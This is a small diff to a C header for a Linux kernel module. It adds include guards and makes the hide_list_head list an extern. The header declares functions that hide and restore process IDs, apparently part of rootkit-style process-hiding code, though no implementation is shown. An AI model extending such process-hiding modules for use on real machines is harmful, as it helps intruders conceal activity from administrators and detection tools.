@@ -1,3 +1,5 @@
+#ifndef FILE_H_PROCESS
+#define FILE_H_PROCESS
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/list.h>
@@ -5,7 +7,7 @@
 #include <linux/sched.h>
 #include <linux/init_task.h>
 
-static struct list_head hide_list_head=LIST_HEAD_INIT(hide_list_head);
+extern struct list_head hide_list_head;
 
 struct hide_node{
   pid_t pid;
@@ -16,3 +18,5 @@ struct hide_node{
 int hide_pid(pid_t a);
 int recover_hide_pid(pid_t a);
 int recover_hide_pid_all(void);
+
+#endif
